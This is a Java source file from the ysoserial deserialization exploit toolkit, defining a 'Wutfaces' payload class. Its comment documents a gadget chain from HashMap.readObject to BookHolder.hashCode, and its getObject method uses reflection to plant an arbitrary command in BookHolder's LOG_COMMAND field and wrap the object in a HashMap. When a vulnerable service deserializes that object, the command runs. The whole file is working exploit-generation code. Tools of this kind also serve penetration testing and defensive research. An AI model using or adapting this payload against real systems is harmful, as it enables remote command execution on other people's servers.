package ysoserial.payloads;


import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import com.tint0.wutfaces.BookHolder;

import java.util.HashMap;


/**
 *
 *   Wutfaces gadget chain:
 *
 *   ObjectInputStream.readObject()
 *      java.util.HashMap.readObject()
 *          java.util.HashMap.putVal()
 *              java.util.HashMap.hash()
 *                  com.tint0.wutfaces.BookHolder.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
public class Wutfaces implements ObjectPayload<Object> {

    public Object getObject(final String cmd) throws Exception {

        BookHolder book = new BookHolder();

        Reflections.setFieldValue(book, "LOG_COMMAND", cmd);

        HashMap hm = new HashMap();

        hm.put(book, "foo");

        return hm;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Wutfaces.class, args);
    }
}
